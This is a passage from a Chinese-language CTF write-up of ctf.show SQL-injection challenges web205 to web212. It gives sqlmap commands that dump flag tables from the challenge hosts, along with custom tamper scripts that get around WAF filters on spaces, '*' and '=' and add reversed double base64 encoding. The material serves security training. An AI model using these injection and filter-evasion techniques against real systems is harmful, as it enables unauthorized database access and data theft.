class="code"><pre><code class="hljs bash">sqlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web --tables<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flax -dump<br></code></pre></td></tr></table></figure><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p> sql需要闭合，等于没变化，sqlmap默认闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv -dump<br></code></pre></td></tr></table></figure><p>中间有跳步骤，我只粘贴刚开始和最后的脚本</p><h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><p>从这里我从虚拟机换成了wsl，所以命令会稍微有点不同，主要是方便改脚本</p><p>–tamper 的初体验</p><p><code>--tamper</code> 是 SQLMap 工具中的一个选项，主要用于绕过 WAF（Web应用防火墙）或其他防护机制。通过 <code>--tamper</code> 选项，SQLMap 可以应用自定义的脚本对 SQL 注入的 payload 进行修改，使其不容易被检测到。具体来说，<code>--tamper</code> 的功能是对生成的 SQL 语句进行轻微的修改.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show//api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web207<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show//api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxca -C flagvc -dump --tamper=web207<br></code></pre></td></tr></table></figure><p>流程都是一样的我只放第一步和最后一步的，都是按库表列进行爆，脚本我用的y4师傅的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>在这段代码中，chr(0x0a)用于替换 payload 中的空格，使得这些空格被转换为换行。可以观察原来的space2comment的脚本，原来的脚本是利用<code>/**/</code>进行绕过，这里利用换行进行绕过</p><h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><p>分析下这题，过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对传入的参数进行了过滤</span><br><span class="hljs-comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ /&#x27;</span>, <span class="hljs-variable">$str</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>过滤了空格和select,sqlmap默认是大写的，所以四舍五入没有，然后空格可以直接使用space2coment，然后流程都是一样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> sqlmap.py -u https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/getToken.php --safe-freq=<span class="hljs-number">1</span> --dbs --tamper=space2comment<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> sqlmap.py -u https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/getToken.php --safe-freq=<span class="hljs-number">1</span> -D ctfshow_web -T ctfshow_flaxcac -C flagvca -dump --tamper=space2comment<br></code></pre></td></tr></table></figure><h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\=/&#x27;</span>, <span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><p>过滤了等于可以用like进行绕过，过滤了*,继续用自写脚本吧</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python3 sqlmap.py -u https://e1913103-c779-4ae7-<span class="hljs-number">95b9</span>-a05a83ce161d.challenge.ctf.<span class="hljs-built_in">show</span>/api/index.php --<span class="hljs-built_in">method</span>=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.<span class="hljs-built_in">show</span> --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e1913103-c779-4ae7-<span class="hljs-number">95b9</span>-a05a83ce161d.challenge.ctf.<span class="hljs-built_in">show</span>/api/getToken.php --safe-freq=<span class="hljs-number">1</span> --dbs --tamper=web209<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e1913103-c779-4ae7-95b9-a05a83ce161d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e1913103-c779-4ae7-95b9-a05a83ce161d.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx -dump --tamper=web209<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;*&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;=&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)+<span class="hljs-string">&#x27;like&#x27;</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></table></figure><p><code>*</code>，将其替换为字符 <code>1</code> (<code>chr(0x31)</code>) 并继续处理下一个字符</p><p><code>=</code>，在返回值中插入换行符 (<code>\n</code>)，后跟 <code>&#39;like&#39;</code>，再插入一个换行符</p><h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$id</span>))));<br></code></pre></td></tr></table></figure><p>这段代码实现了对字符串 <code>$id</code> 的双重 Base64 解码和反转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web210<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx -dump --tamper=web210<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = payload[::-<span class="hljs-number">1</span>].encode()<br>    payload = base64.b64encode(payload)<br>    payload = (payload.decode())[::-<span class="hljs-number">1</span>]<br>    payload = base64.b64encode(payload.encode())<br>    <span class="hljs-keyword">return</span> payload.decode()<br></code></pre></td></tr></table></figure><h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ /&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在上一题的基础上加了一个空格绕过，稍微微调一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>           <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web211<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa -dump --tamper=web211<br></code></pre></td></tr></table></figure><h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$id</span>))));<br>  &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*/&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>加了这些限制，继续修改脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;*&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> 